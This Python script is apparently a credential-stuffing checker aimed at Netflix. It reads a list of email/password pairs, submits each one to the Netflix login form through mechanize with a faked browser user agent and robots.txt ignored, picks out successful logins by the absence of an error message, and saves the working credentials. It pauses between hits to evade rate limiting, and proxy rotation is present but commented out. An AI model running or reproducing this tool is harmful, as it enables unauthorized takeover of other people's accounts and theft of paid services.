import mechanize as ms
from bs4 import BeautifulSoup as Bs
from file_handler import open_list, output_credentials, proxy_setup
import time
import pprint as pp

form_email = 'userLoginId'
form_password = 'password'
log_in = 'https://www.netflix.com/login'
log_out = 'https://www.netflix.com/SignOut?lnkctr=mL'


def main():
    credentials = open_list()
    br = ms.Browser()
    # br.set_proxies(proxy_setup())
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.addheaders = [('User-agent', 'Firefox')]
    response_connection = br.open(log_in)

    if response_connection.getcode() == 200:
        for key in credentials.keys():
            br.select_form(nr=0)
            # print(br)
            # print(f'{key} {credentials.get(key)}')
            br.form[form_email] = key
            br.form[form_password] = credentials.get(key)
            print(br)
            response = br.submit()
            print(response.geturl())
            if validate(response.read().decode(), [credentials.get(key), key]):
                br.open(log_out)
                time.sleep(300)
                br.open(log_in)
    else:
        print(f'Browser can\'t be initialized, http code: {response_connection.getcode()}')
        time.sleep(5000)
        exit()


def validate(response, credentials):
    soup = Bs(response, 'html.parser')
    print(soup.text)
    if soup.text.find('Please try again') != -1:
        print('wrong password or email \n')
        return False
    else:
        print('correct password \n')
        output_credentials(credentials)
        return True


if __name__ == '__main__':
    main()
else:
    exit()